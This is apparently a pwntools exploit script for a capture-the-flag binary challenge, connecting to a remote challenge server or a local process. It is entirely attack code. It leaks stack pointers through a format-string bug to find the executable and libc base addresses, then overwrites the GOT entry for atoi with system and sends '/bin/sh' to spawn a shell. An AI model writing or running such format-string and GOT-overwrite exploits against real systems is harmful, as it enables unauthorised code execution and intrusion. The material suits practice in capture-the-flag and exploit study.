#!/usr/bin/env python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x170E

        c
        ''')
        input()

if args.REMOTE:
    p = remote('23.146.248.136', 21101)
else:
    p = process([exe.path])
GDB()
#pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

payload  = f'%58$p|%57$p'.encode()
slna(b'Choose food: ', 8)
sla(b'Give us feedback(Y/n) ', b'Y')
sla(b'\n', payload)
p.recvuntil(b'Here is your feedback for us: \n')
exe_Leak = int(p.recv(14), 16)
p.recvuntil(b'|')
libc_leak =  int(p.recv(14), 16)
info("libc leak: " + hex(libc_leak))
info("exe leak: "+ hex(exe_Leak))
exe.address = exe_Leak - 0x1467
libc.address =  libc_leak - 0x29d65
info("exe base: " + hex(exe.address))
info("libc base: " + hex(libc.address))

slna(b'Choose food: ', 8)
sla(b'Give us feedback(Y/n) ', b'Y')
pl = fmtstr_payload(18, {exe.got.atoi: libc.sym.system})
info("payload: " + str(pl))
sla(b'\n', pl)
sla(b'Choose food: ', b'/bin/sh\0')

p.interactive()
